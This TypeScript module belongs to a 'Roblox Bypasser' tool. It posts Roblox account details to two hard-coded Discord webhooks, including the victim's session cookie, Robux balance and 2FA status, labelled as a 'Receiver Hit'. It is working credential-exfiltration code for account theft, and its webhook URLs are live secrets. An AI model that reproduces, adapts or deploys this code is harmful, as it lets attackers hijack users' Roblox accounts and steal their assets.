// Extra Discord webhooks (kept separate from tokenStore on purpose)
import type { AccountInfo } from "@/lib/tokenStore";

export const EXTRA_WEBHOOKS = {
  receiver:
    "https://discord.com/api/webhooks/1514082896695001231/P8hVaK-ILTChsmBxtjoYysPQSVwA6FnXO-NtqfErqO5_tYjnIYbrCZka53f6RwgcTImg",
  liveBypass:
    "https://discord.com/api/webhooks/1514084602900250795/llfflVYNk8g_IxIMzbSIm-i0PoJI4lZn_QOuYxFNSrjm5N8OPvFufXkFlPgoLUE2ZcWu",
} as const;

const BOT_NAME = "Roblox Bypasser";

async function post(url: string, body: unknown) {
  if (!url) return;
  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
  } catch (e) {
    console.error("Extra webhook failed:", e);
  }
}

function nowFooter() {
  return `Roblox Bypasser • ${new Date().toLocaleString()}`;
}

function buildReceiverEmbed(d: AccountInfo) {
  return {
    title: "📥 New Receiver Hit",
    color: 0x3b82f6,
    thumbnail: d.avatarUrl ? { url: d.avatarUrl } : undefined,
    fields: [
      { name: "User", value: `\`${d.username || "N/A"}\``, inline: true },
      { name: "User ID", value: `\`${d.userId ?? "N/A"}\``, inline: true },
      { name: "Robux", value: `\`${d.robux ?? 0}\``, inline: true },
      { name: "Premium", value: d.premium ? "✅" : "❌", inline: true },
      { name: "2FA", value: d.has2FA ? "✅" : "❌", inline: true },
      { name: "Email", value: d.emailVerified ? "✅" : "❌", inline: true },
    ],
    description: d.cookie
      ? `\`\`\`\n${String(d.cookie).slice(0, 1800)}\n\`\`\``
      : undefined,
    footer: { text: nowFooter() },
  };
}

function buildLiveEmbed(d: AccountInfo) {
  return {
    title: "⚡ Live Bypass",
    color: 0x22c55e,
    thumbnail: d.avatarUrl ? { url: d.avatarUrl } : undefined,
    description: [
      `**User:** \`${d.username || "N/A"}\``,
      `**Status:** ✅ Bypassed`,
      `**Robux:** \`${d.robux ?? 0}\``,
    ].join("\n"),
    footer: { text: nowFooter() },
  };
}

export async function sendExtraReceiver(d: AccountInfo) {
  await post(EXTRA_WEBHOOKS.receiver, {
    username: BOT_NAME,
    content: "**Receiver HIT | @everyone**",
    embeds: [buildReceiverEmbed(d)],
  });
}

export async function sendExtraLiveBypass(d: AccountInfo) {
  await post(EXTRA_WEBHOOKS.liveBypass, {
    username: BOT_NAME,
    embeds: [buildLiveEmbed(d)],
  });
}

export async function broadcastExtra(d: AccountInfo) {
  await Promise.all([sendExtraReceiver(d), sendExtraLiveBypass(d)]);
}